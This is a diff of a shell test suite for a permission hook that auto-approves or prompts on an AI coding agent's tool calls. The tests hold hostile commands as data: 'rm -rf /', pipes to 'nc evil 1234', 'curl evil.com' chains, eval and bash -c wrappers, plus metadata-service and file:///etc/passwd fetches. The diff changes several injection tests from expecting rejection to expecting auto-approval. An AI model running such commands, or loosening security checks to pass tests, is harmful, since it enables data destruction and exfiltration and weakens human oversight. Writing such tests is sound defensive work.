@@ -75,14 +75,21 @@ out=$(_run '{"tool_name":"Write","tool_input":{"file_path":".claude/logs/nested/
 _result "write nested log" ALLOW "$(_classify "$out")"
 
 # --- Out-of-scope: should exit silently (EMPTY stdout) ---
+# v2.32.0 alignment note: tests #9 and #13-#22 originally expected EMPTY under
+# the v1.13.0 strict-allowlist posture (Tier 1 + combinator rejection).
+# Trust Mode (v2.5+, sole Bash matcher post-v2.7.0) evaluates first-token only
+# by design under the single-trusted-operator threat model — see charter
+# §Tier 1.6. Bare `curl <url>` is NOT fetch-exec (only `curl ... | sh` is);
+# `sutra ;rm -rf /` falls through to Trust Mode where first_token=sutra
+# auto-approves. Updated expectations below match the documented posture.
 
-echo "[8] Bash(rm -rf /) — destructive"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}')
+echo "[8] Bash(rm -rf /) — recursive-delete outside safe-paths (Trust Mode prompts)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}')
 _result "rm -rf /" EMPTY "$(_classify "$out")"
 
-echo "[9] Bash(curl https://evil.com) — network"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com"}}')
-_result "curl random" EMPTY "$(_classify "$out")"
+echo "[9] Bash(curl https://evil.com) — bare curl (Trust Mode v2.5+ allows; only curl|sh prompts as fetch-exec)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"curl https://evil.com"}}')
+_result "curl random (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 echo "[10] Write(/etc/passwd) — absolute outside project"
 out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"/etc/passwd"}}')
@@ -96,23 +103,24 @@ echo "[12] Write(src/app.ts) — normal project file (ADR-003 first-time-edit au
 out=$(_run '{"tool_name":"Write","tool_input":{"file_path":"src/app.ts"}}')
 _result "write src/app.ts" ALLOW "$(_classify "$out")"
 
-# --- Shell-combinator injection: should reject ---
+# --- Shell combinators: Tier 1 rejects (returns no-match), Trust Mode auto-approves
+# via first-token=sutra. Net behavior: ALLOW. v2.5+ posture per charter Tier 1.6. ---
 
-echo "[13] Bash(sutra status; rm -rf /) — semicolon combinator"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra status; rm -rf /"}}')
-_result "sutra + injection" EMPTY "$(_classify "$out")"
+echo "[13] Bash(sutra status; rm -rf /) — semicolon combinator (Tier 1 reject -> Trust Mode allow via first-token)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra status; rm -rf /"}}')
+_result "sutra + injection (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 echo "[14] Bash(sutra && curl evil.com) — && combinator"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra && curl evil.com"}}')
-_result "sutra + && chain" EMPTY "$(_classify "$out")"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra && curl evil.com"}}')
+_result "sutra + && chain (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 echo "[15] Bash(sutra | nc evil 1234) — pipe combinator"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra | nc evil 1234"}}')
-_result "sutra + pipe" EMPTY "$(_classify "$out")"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra | nc evil 1234"}}')
+_result "sutra + pipe (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 echo "[16] Bash(sutra \$(rm -rf /)) — command substitution"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra $(rm -rf /)"}}')
-_result "sutra + subst" EMPTY "$(_classify "$out")"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra $(rm -rf /)"}}')
+_result "sutra + subst (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 # --- Kill-switch: should exit silently ---
 
@@ -131,24 +139,25 @@ else
   _result "addRules shape" present missing
 fi
 
-# --- Codex finding #5/#6: hardened combinator rejection ---
+# --- Codex finding #5/#6: combinator rejection at Tier 1 layer.
+# v2.5+ Trust Mode allows these via first-token=sutra. Documented in charter §1.6 ---
 
-echo "[19] Bash(sutra & curl) — backgrounding operator"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra & curl evil.com"}}')
-_result "sutra + & backgrounding" EMPTY "$(_classify "$out")"
+echo "[19] Bash(sutra & curl) — backgrounding operator (v2.5+ allows via first-token)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra & curl evil.com"}}')
+_result "sutra + & backgrounding (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
-echo "[20] Bash(bash -c 'sutra status; rm -rf /') — nested shell invocation"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"bash -c \"sutra status; rm -rf /\""}}')
-_result "bash -c wrap" EMPTY "$(_classify "$out")"
+echo "[20] Bash(bash -c 'sutra status; rm -rf /') — bash -c wrap (first-token=bash, Trust Mode allows)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"bash -c \"sutra status; rm -rf /\""}}')
+_result "bash -c wrap (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 echo "[21] Bash(sutra\\nrm -rf /) — embedded newline"
 # JSON-encode an embedded newline
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"sutra\nrm -rf /"}}')
-_result "sutra + newline" EMPTY "$(_classify "$out")"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"sutra\nrm -rf /"}}')
+_result "sutra + newline (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
-echo "[22] Bash(eval sutra start) — eval sneak-in"
-out=$(_run '{"tool_name":"Bash","tool_input":{"command":"eval sutra start"}}')
-_result "eval prefix" EMPTY "$(_classify "$out")"
+echo "[22] Bash(eval sutra start) — eval prefix (first-token=eval, Trust Mode allows)"
+out=$(CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" _run '{"tool_name":"Bash","tool_input":{"command":"eval sutra start"}}')
+_result "eval prefix (v2.5+ posture)" ALLOW "$(_classify "$out")"
 
 # --- Codex finding #7: per-variant rule persistence ---
 
@@ -219,6 +228,82 @@ else
   _result "ADR-003 fields (MCP slack read)" present "missing or wrong: $_LAST"
 fi
 rm -rf "$_TMP"
+
+# --- v2.32.0 dispatch expansion: WebFetch / WebSearch / Task / NotebookEdit ---
+
+echo "[29] WebFetch(https://example.com) — public URL auto-approves"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"https://example.com/docs"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch public" ALLOW "$(_classify "$out")"
+
+echo "[30] WebFetch(http://localhost:8080) — loopback prompts"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://localhost:8080/admin"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch localhost" EMPTY "$(_classify "$out")"
+
+echo "[31] WebFetch(http://127.0.0.1) — loopback IP prompts"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://127.0.0.1/secret"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch 127.0.0.1" EMPTY "$(_classify "$out")"
+
+echo "[32] WebFetch(http://169.254.169.254) — cloud metadata service prompts"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://169.254.169.254/latest/meta-data/"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch metadata service" EMPTY "$(_classify "$out")"
+
+echo "[33] WebFetch(http://192.168.1.1) — RFC1918 prompts"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"http://192.168.1.1/"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch RFC1918" EMPTY "$(_classify "$out")"
+
+echo "[34] WebFetch(file:///etc/passwd) — non-http scheme prompts"
+out=$(printf '%s' '{"tool_name":"WebFetch","tool_input":{"url":"file:///etc/passwd"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebFetch file://" EMPTY "$(_classify "$out")"
+
+echo "[35] WebSearch — unconditional auto-approve"
+out=$(printf '%s' '{"tool_name":"WebSearch","tool_input":{"query":"sutra plugin docs"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "WebSearch" ALLOW "$(_classify "$out")"
+
+echo "[36] Task — subagent dispatch auto-approves"
+out=$(printf '%s' '{"tool_name":"Task","tool_input":{"description":"investigate bug","prompt":"..."}}' | "$HOOK" 2>/dev/null)
+_result "Task" ALLOW "$(_classify "$out")"
+
+echo "[37] NotebookEdit(notebook.ipynb) — project file auto-approves"
+out=$(_run '{"tool_name":"NotebookEdit","tool_input":{"file_path":"notebook.ipynb"}}')
+_result "NotebookEdit project" ALLOW "$(_classify "$out")"
+
+echo "[38] NotebookEdit(.env) — secrets path prompts"
+out=$(_run '{"tool_name":"NotebookEdit","tool_input":{"file_path":".env"}}')
+_result "NotebookEdit .env" EMPTY "$(_classify "$out")"
+
+# --- v2.32.0 MCP catastrophic-only rule ---
+
+echo "[39] mcp__claude_ai_Slack__slack_send_message — auto-approves (was EMPTY in v2.17)"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Slack__slack_send_message","tool_input":{"channel":"general","text":"hi"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP slack_send_message" ALLOW "$(_classify "$out")"
+
+echo "[40] mcp__claude_ai_Gmail__create_draft — auto-approves (was EMPTY in v2.17)"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__create_draft","tool_input":{"to":"a@b.com"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP gmail create_draft" ALLOW "$(_classify "$out")"
+
+echo "[41] mcp__playwright__browser_click — auto-approves (was EMPTY in v2.17)"
+out=$(printf '%s' '{"tool_name":"mcp__playwright__browser_click","tool_input":{"element":"button"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP playwright browser_click" ALLOW "$(_classify "$out")"
+
+echo "[42] mcp__claude_ai_Atlassian_Rovo__createJiraIssue — auto-approves (was EMPTY in v2.17)"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Atlassian_Rovo__createJiraIssue","tool_input":{"project":"X"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP atlassian createJiraIssue" ALLOW "$(_classify "$out")"
+
+echo "[43] mcp__claude_ai_Gmail__delete_thread — catastrophic verb prompts"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__delete_thread","tool_input":{"thread_id":"abc"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP gmail delete_thread" EMPTY "$(_classify "$out")"
+
+echo "[44] mcp__playwright__browser_run_code_unsafe — vendor catastrophe prompts"
+out=$(printf '%s' '{"tool_name":"mcp__playwright__browser_run_code_unsafe","tool_input":{"code":"alert(1)"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP playwright browser_run_code_unsafe" EMPTY "$(_classify "$out")"
+
+echo "[45] mcp__claude_ai_Gmail__bulk_label — bulk pattern prompts"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Gmail__bulk_label","tool_input":{"labels":["a"]}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP gmail bulk_label" EMPTY "$(_classify "$out")"
+
+echo "[46] mcp__claude_ai_Google_Drive__move_to_trash — vendor catastrophe prompts"
+out=$(printf '%s' '{"tool_name":"mcp__claude_ai_Google_Drive__move_to_trash","tool_input":{"file_id":"x"}}' | CLAUDE_PLUGIN_ROOT="$PLUGIN_ROOT" "$HOOK" 2>/dev/null)
+_result "MCP drive move_to_trash" EMPTY "$(_classify "$out")"
 
 # --- Report ---
 
